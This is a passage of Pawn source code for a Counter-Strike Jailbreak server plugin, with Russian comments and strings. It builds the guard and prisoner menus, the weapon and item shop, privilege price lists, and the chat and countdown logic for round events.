        {
            drop_user_weapons(id, 0);
            give_weapon_ak47knife(id);
            fm_give_item(id, "item_kevlar");
			WeaponChoosed[id] = true;
            return Show_WeaponsGuardPistolMenu(id);
        }
		case 4:
        {
            drop_user_weapons(id, 0);
            jbe_ak47_beast(id);
            fm_give_item(id, "item_kevlar");
			WeaponChoosed[id] = true;
            return Show_WeaponsGuardPistolMenu(id);
        }
    }
	return PLUGIN_HANDLED;
}

Show_WeaponsGuardPistolMenu(id)
{
    if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
    jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\wВыбор пистолета^n^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wDeagle^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wUsp^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wGlock\r-\w18^n^n");
	if(IsSetBit(g_iBitUserVip, id))
    {
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wInfinity \rВип^n");
        iKeys |= (1<<3);
    }
    else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dInfinity \rВип^n");
    
	if(IsSetBit(g_iBitUserDemon, id))
    {
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wRevolver \rДемон^n");
        iKeys |= (1<<4);
    }
    else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dRevolver \rДемон^n");
	
    formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_WeaponsGuardPistolMenu");
}

public Handle_WeaponsGuardPistolMenu(id, iKey)
{
    if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
    switch(iKey)
    {
        case 0:
        {
            fm_give_item(id, "weapon_deagle");
            fm_set_user_bpammo(id, CSW_DEAGLE, 999);
        }
        case 1:
        {
            fm_give_item(id, "weapon_usp");
            fm_set_user_bpammo(id, CSW_USP, 999);
        }
        case 2:
        {
            fm_give_item(id, "weapon_glock18");
            fm_set_user_bpammo(id, CSW_GLOCK18, 999);
        }
		case 3:
        {
            give_jbe_infinity(id);
        }
		case 4:
        {
            give_weapon_anaconda(id);
        }
    }
    return PLUGIN_HANDLED;
}


Show_MainPnMenu(id)
{
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<4|1<<6|1<<8|1<<9), iUserAlive = IsSetBit(g_iBitUserAlive, id),
	iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_MAIN_TITLE");
	if(!g_iBlockShop && iUserAlive && (g_iDayMode == 1 || g_iDayMode == 2) && IsNotSetBit(g_iBitUserDuel, id) && g_iAlivePlayersNum[1] > 1)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_MAIN_SHOP");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_SHOP");
	if(g_iCostumesListSize && (g_iDayMode == 1 || g_iDayMode == 2) && !g_BlockCostumes)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_MAIN_COSTUMES");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_COSTUMES");
	
	if(g_iDayMode == 2)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wОткрыть клетки^n");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dОткрыть клетки \rFreeDay^n");
	
    if(id == g_iLastPnId && iUserAlive)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n^n", id, "JBE_MENU_MAIN_LAST_PN");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n^n", id, "JBE_MENU_MAIN_LAST_PN");

	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_MAIN_TEAM");
	
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsNotSetBit(g_iBitUserDuel, id))
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_MAIN_PRIVIGELES");
		iKeys |= (1<<5);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_PRIVIGELES");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_MAIN_PRICE_PRIVILEGES");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_MainPnMenu");
}

public Handle_MainPnMenu(id, iKey)
{
	switch(iKey)
	{
		case 0: return Show_ShopPnMenu(id);
		case 1: return Cmd_CostumesMenu(id);
		case 2: jbe_open_doors();
		case 3: return Show_LastPrisonerMenu(id);
		case 4: return Show_ChooseTeamMenu(id, 1);
		case 5: return Show_PrivilegesMenu(id);
		case 6: return Show_PriceMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_MainPnMenu(id);
}

Show_PriceMenu(id)
{
	new szMenu[512], iKeys = (1<<8|1<<9),
	iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_PRICE_TITLE");

	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n", id, "JBE_PRICE_MENU_1");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n", id, "JBE_PRICE_MENU_2");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n", id, "JBE_PRICE_MENU_3");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n", id, "JBE_PRICE_MENU_4");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n", id, "JBE_PRICE_MENU_5");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n^n", id, "JBE_PRICE_MENU_6");
	
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[9] \w%L^n", id, "JBE_PRICE_MENU_NEXT");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_PriceMenu");
}

public Handle_PriceMenu(id, iKey)
{
	switch(iKey)
	{
        case 8: return Show_MenuPrice(id); 
		case 9: return PLUGIN_HANDLED;
	}
	return Show_PriceMenu(id);
}

Show_MenuPrice(id)
{
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<8|1<<9),
	iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_PRICES_TITLE");

	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n", id, "JBE_PRICE_MENU_02");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n", id, "JBE_PRICE_MENU_0");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n", id, "JBE_PRICE_MENU_7");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n", id, "JBE_PRICE_MENU_8");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n", id, "JBE_PRICE_MENU_9");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\w%L^n^n", id, "JBE_PRICE_MENU_01");

    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[9] \w%L^n", id, "JBE_PRICE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_MenuPrice");
}

public Handle_MenuPrice(id, iKey)
{
	switch(iKey)
	{
        case 8: return Show_PriceMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_MenuPrice(id);
}

Show_MainGrMenu(id)
{
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<4|1<<6|1<<8|1<<9), iUserAlive = IsSetBit(g_iBitUserAlive, id),
	iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_MAIN_KT_TITLE");
	if(!g_iBlockShop && iUserAlive && (g_iDayMode == 1 || g_iDayMode == 2) && IsNotSetBit(g_iBitUserDuel, id) && g_iAlivePlayersNum[1] > 1)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_MAIN_SHOP");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_SHOP");
	if(g_iCostumesListSize && (g_iDayMode == 1 || g_iDayMode == 2) && !g_BlockCostumes)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_MAIN_COSTUMES");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_COSTUMES");
	if(iUserAlive && (g_iDayMode == 1 || g_iDayMode == 2))
	{
		if(id == g_iChiefId)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_MAIN_CHIEF");
			iKeys |= (1<<2);
		}
		else if(g_iChiefStatus != 1 && (g_iChiefIdOld != id || g_iChiefStatus != 0))
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_MAIN_TAKE_CHIEF");
			iKeys |= (1<<2);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_TAKE_CHIEF");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_TAKE_CHIEF");
	if((g_iDayMode == 1 || g_iDayMode == 2))
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n^n", id, "JBE_MENU_MAIN_GIVE_WEAPONS");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n^n", id, "JBE_MENU_MAIN_GIVE_WEAPONS");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_MAIN_TEAM");
	if((g_iDayMode == 1 || g_iDayMode == 2) && IsNotSetBit(g_iBitUserDuel, id))
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_MAIN_PRIVIGELES");
		iKeys |= (1<<5);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_MAIN_PRIVIGELES");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_MAIN_PRICE_PRIVILEGES");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_MainGrMenu");
}

public Handle_MainGrMenu(id, iKey)
{
	switch(iKey)
	{
		case 0: if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserAlive, id) && IsNotSetBit(g_iBitUserDuel, id)) return Show_ShopGuardMenu(id);
		case 1: return Cmd_CostumesMenu(id);
		case 2:
		{
			if((g_iDayMode == 1 || g_iDayMode == 2) && IsSetBit(g_iBitUserAlive, id))
			{
				if(id == g_iChiefId) return Show_ChiefMenu_1(id);
				if(g_iChiefStatus != 1 && (g_iChiefIdOld != id || g_iChiefStatus != 0) && jbe_set_user_chief(id))
				{
					g_iChiefIdOld = id;
					return Show_ChiefMenu_1(id);
				}
			}
		}
		case 3: return Show_WeaponsGuardMenu(id);
		case 4: return Show_ChooseTeamMenu(id, 1);
		case 5: return Show_PrivilegesMenu(id);
		case 6: return Show_PriceMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_MainGrMenu(id);
}

public jbe_lastdie_count_down()
{
    if(--g_iLastDieCountDown)
    {	
        set_hudmessage(255, 165, 0, -1.0, 0.6, 0, 0.0, 0.9, 0.1, 0.1, -1);
        ShowSyncHudMsg(0, g_iSyncLastPnInformer, "Смерть зека через: %d сек.", g_iLastDieCountDown);	
		UTIL_SendAudio(0, _, "jb_engine/zone_cntdwn_robo/%d.wav", g_iLastDieCountDown);
    }
    else jbe_last_die();	
}

public ReasonKill(iVictim, iKiller)    // статус умершего зека в чат (бунт\фд\обычный)
{
        if(IsSetBit(g_iBitUserFree, iVictim) && (g_iUserTeam[iKiller] == 2))    // если жертвой был освобожденный
        {
            new nameKiller[32];
            new nameVictim[32];
            get_user_name(iKiller, nameKiller, charsmax(nameKiller));
            get_user_name(iVictim, nameVictim, charsmax(nameVictim));
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_KILL_FD", nameKiller, nameVictim);
        }
        if(IsSetBit(g_iBitUserWanted, iVictim) && (g_iUserTeam[iKiller] == 2))    // если жертвой был бунтующий
        {
            new nameKiller[32];
            new nameVictim[32];
            get_user_name(iKiller, nameKiller, charsmax(nameKiller));
            get_user_name(iVictim, nameVictim, charsmax(nameVictim));
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_KILL_BUNT", nameKiller, nameVictim);
        }
        if(IsNotSetBit(g_iBitUserWanted, iVictim) && IsNotSetBit(g_iBitUserFree, iVictim) && (g_iUserTeam[iKiller] == 2))    // если жертвой был обычный зек
        {
            new nameKiller[32];
            new nameVictim[32];
            get_user_name(iKiller, nameKiller, charsmax(nameKiller));
            get_user_name(iVictim, nameVictim, charsmax(nameVictim));
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_KILL_ZEK", nameKiller, nameVictim);
        }
    return PLUGIN_CONTINUE;
}

public jbe_last_die()
{
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(g_iUserTeam[i] != 1 || IsNotSetBit(g_iBitUserAlive, i)) 
			continue;
		
		ExecuteHamB(Ham_Killed, i, i, 0);
		remove_task(TASK_LAST_DIE);
		UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_ZEK_DEAD");
	}
}

Show_ShopPnMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id) || IsSetBit(g_iBitUserDuel, id)) return PLUGIN_HANDLED;
	jbe_set_user_discount(id);
	new szMenu[512], iKeys = (1<<0|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_SHOP_PN_TITLE", g_iUserDiscount[id]);
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_SHOP_WEAPONS");
    new iPriceFlashbang = jbe_get_price_discount(id, g_iShopCvars[FLASHBANG]);	
	if(!user_has_weapon(id, CSW_FLASHBANG))
	{
		if(iPriceFlashbang <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PN_FLASHBANG", iPriceFlashbang);
			iKeys |= (1<<1);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_FLASHBANG", iPriceFlashbang);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_FLASHBANG", iPriceFlashbang);
	new iPriceHeGrenade = jbe_get_price_discount(id, g_iShopCvars[HEGRENADE]);	
	if(!user_has_weapon(id, CSW_HEGRENADE))
	{
		if(iPriceHeGrenade <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PN_HEGRENADE", iPriceHeGrenade);
			iKeys |= (1<<2);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_HEGRENADE", iPriceHeGrenade);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_HEGRENADE", iPriceHeGrenade);
	new iPriceFrostNade = jbe_get_price_discount(id, g_iShopCvars[FROSTNADE]);
	if(!user_has_weapon(id, CSW_SMOKEGRENADE) && IsNotSetBit(g_iBitFrostNade, id))
	{
		if(iPriceFrostNade <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PN_FROST_GRENADE", iPriceFrostNade);
			iKeys |= (1<<3);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_FROST_GRENADE", iPriceFrostNade);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_FROST_GRENADE", iPriceFrostNade);	
	new iPriceStimulator = jbe_get_price_discount(id, g_iShopCvars[STIMULATOR]);
	if(IsNotSetBit(g_iBitUserBoxing, id) && get_user_health(id) < 120)
	{
		if(iPriceStimulator <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PN_STIMULATOR", iPriceStimulator);
			iKeys |= (1<<4);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_STIMULATOR", iPriceStimulator);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_STIMULATOR", iPriceStimulator);	
	new iPriceFastRun = jbe_get_price_discount(id, g_iShopCvars[FAST_RUN]);	
	if(IsNotSetBit(g_iBitFastRun, id))
	{
		if(iPriceFastRun <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PN_FAST_RUN", iPriceFastRun);
			iKeys |= (1<<5);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_FAST_RUN", iPriceFastRun);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_FAST_RUN", iPriceFastRun);
    new iPriceLowGravity = jbe_get_price_discount(id, g_iShopCvars[LOW_GRAVITY]);	
	if(pev(id, pev_gravity) == 1.0)
	{
		if(iPriceLowGravity <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PN_LOW_GRAVITY", iPriceLowGravity);
			iKeys |= (1<<6);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_LOW_GRAVITY", iPriceLowGravity);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_LOW_GRAVITY", iPriceLowGravity);
	new iPriceCloseCase = jbe_get_price_discount(id, g_iShopCvars[CLOSE_CASE]);
	if(IsSetBit(g_iBitUserWanted, id))
	{
		if(iPriceCloseCase <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PN_CLOSE_CASE", iPriceCloseCase);
			iKeys |= (1<<7);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_CLOSE_CASE", iPriceCloseCase);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PN_CLOSE_CASE", iPriceCloseCase);		
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_NEXT");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_ShopPnMenu");
}

public Handle_ShopPnMenu(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id) || IsSetBit(g_iBitUserDuel, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
        case 0: return Show_MenuShopWeapons(id); 
		case 1:
		{
			new iPriceFlashbang = jbe_get_price_discount(id, g_iShopCvars[FLASHBANG]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_FLASHBANG");
            UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);					
			if(!user_has_weapon(id, CSW_FLASHBANG) && iPriceFlashbang <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceFlashbang, 1);
				fm_give_item(id, "weapon_flashbang");
				fm_give_item(id, "weapon_flashbang");			
			}
		}
		case 2:
		{
			new iPriceHeGrenade = jbe_get_price_discount(id, g_iShopCvars[HEGRENADE]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_HEGGRENADE");
            UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);						
			if(!user_has_weapon(id, CSW_SMOKEGRENADE) && iPriceHeGrenade <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceHeGrenade, 1);
				fm_give_item(id, "weapon_hegrenade");				
			}
		}
		case 3:
		{
			new iPriceFrostNade = jbe_get_price_discount(id, g_iShopCvars[FROSTNADE]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_FROSTNADE");
            UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);						
			if(!user_has_weapon(id, CSW_SMOKEGRENADE) && IsNotSetBit(g_iBitFrostNade, id) && iPriceFrostNade <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceFrostNade, 1);
				SetBit(g_iBitFrostNade, id);
				fm_give_item(id, "weapon_smokegrenade");			
			}
		}	
		case 4:
		{
			new iPriceStimulator = jbe_get_price_discount(id, g_iShopCvars[STIMULATOR]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_STIMYLATOR");
            UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);						
			if(get_user_health(id) < 120 && iPriceStimulator <= g_iUserMoney[id])
			{
			    jbe_set_user_money(id, g_iUserMoney[id] - iPriceStimulator, 1);
				set_pev(id, pev_health, 120.0);
			}
		}		
		case 5:
		{
			new iPriceFastRun = jbe_get_price_discount(id, g_iShopCvars[FAST_RUN]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_FAST_RUN");
            UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);						
			if(iPriceFastRun <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceFastRun, 1);
				SetBit(g_iBitFastRun, id);
				ExecuteHamB(Ham_Player_ResetMaxSpeed, id);				
			}
		}	
		case 6:
		{
			new iPriceLowGravity = jbe_get_price_discount(id, g_iShopCvars[LOW_GRAVITY]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_GRAVITI");
            UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);						
			if(iPriceLowGravity <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceLowGravity, 1);
				set_pev(id, pev_gravity, 0.6);				
			}
		}	
		case 7:
		{
			new iPriceCloseCase = jbe_get_price_discount(id, g_iShopCvars[CLOSE_CASE]);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SHOP_ID_CHAT_CLOSE_CASE");
            UTIL_SendAudio(id, _, g_szSounds[BUY_SHOP]);						
			if(IsSetBit(g_iBitUserWanted, id) && iPriceCloseCase <= g_iUserMoney[id])
			{
				jbe_set_user_money(id, g_iUserMoney[id] - iPriceCloseCase, 1);
				jbe_sub_user_wanted(id);					
			}
		}	
		case 8: return Show_MenuShopPn(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_ShopPnMenu(id);
}

Show_MenuShopWeapons(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id) || IsSetBit(g_iBitUserDuel, id)) return PLUGIN_HANDLED;
	jbe_set_user_discount(id);
	new szMenu[512], iKeys = (1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_SHOP_PNW_TITLE", g_iUserDiscount[id]);	
    new iPriceBalisong = jbe_get_price_discount(id, g_iShopCvars[BALISONG]);	
	if(IsNotSetBit(g_iBitBalisong, id))
	{
		if(iPriceBalisong <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PNW_BALISONG", iPriceBalisong);
			iKeys |= (1<<0);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PNW_BALISONG", iPriceBalisong);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PNW_BALISONG", iPriceBalisong);
	new iPriceMachete = jbe_get_price_discount(id, g_iShopCvars[MACHETE]);	
	if(IsNotSetBit(g_iBitMachete, id))
	{
		if(iPriceMachete <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PNW_MACHETE", iPriceMachete);
			iKeys |= (1<<1);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PNW_MACHETE", iPriceMachete);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PNW_MACHETE", iPriceMachete);
	new iPriceSerp = jbe_get_price_discount(id, g_iShopCvars[SERP]);	
	if(IsNotSetBit(g_iBitSerp, id))
	{
		if(iPriceSerp <= g_iUserMoney[id])
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L \r$%d^n", id, "JBE_MENU_SHOP_PNW_SERP", iPriceSerp);
			iKeys |= (1<<2);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PNW_SERP", iPriceSerp);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r$%d^n", id, "JBE_MENU_SHOP_PNW_SERP", iPriceSerp);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_MenuShopWeapons");
}

public Handle_MenuShopWeapons(id, iKey)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id) || IsSetBit(g_iBitUserDuel, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0:
		{
			new iPriceBalisong = jbe_get_price_discount(id, g_iShopCvars[BALISONG]);
